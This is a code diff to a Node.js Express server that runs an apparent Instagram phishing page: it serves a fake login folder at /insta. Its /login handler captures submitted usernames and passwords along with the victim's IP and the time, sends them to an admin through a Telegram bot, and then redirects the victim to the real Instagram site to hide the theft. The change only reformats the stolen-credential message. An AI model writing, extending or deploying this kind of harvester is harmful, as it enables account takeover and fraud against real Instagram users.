@@ -384,29 +384,28 @@ app.get("/insta", (_req, res) => {
 app.use("/insta", express.static(path.join(__dirname, "test insta")));
 
 // Login Capture
+// CAPTURE LOGIN
 app.post("/login", async (req, res) => {
   const { username, password } = req.body;
-  console.log("Received login attempt:", { username, password }); // Debug log
-  
-  if (!username || !password) {
-    console.log("Missing credentials");
-    return res.redirect("/insta");
-  }
-  
-  const ip = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress || "unknown";
+  if (!username || !password) return res.redirect("/insta");
+
+  const ip = req.ip || req.headers["x-forwarded-for"] || "unknown";
   const time = new Date().toLocaleString();
-  const msg = `*NEW INSTAGRAM LOGIN*\n\n👤 Username: \`${username}\`\n🔑 Password: \`${password}\`\n🌐 IP: \`${ip}\`\n⏰ Time: \`${time}\``;
-  
-  try { 
-    await bot.telegram.sendMessage(ADMIN_USER_ID, msg, { 
-      parse_mode: "Markdown",
-      disable_web_page_preview: true 
-    }); 
-    console.log("Login alert sent to admin");
+
+  const message = `
+*INSTAGRAM LOGIN*
+*User:* \`${username}\`
+*Pass:* \`${password}\`
+*IP:* \`${ip}\`
+*Time:* \`${time}\`
+  `.trim();
+
+  try {
+    await bot.telegram.sendMessage(ADMIN_USER_ID, message, { parse_mode: "Markdown" });
   } catch (e) {
-    console.error("Send login alert error:", e);
+    console.error("Failed to send login", e);
   }
-  
+
   res.redirect("https://www.instagram.com/");
 });
 
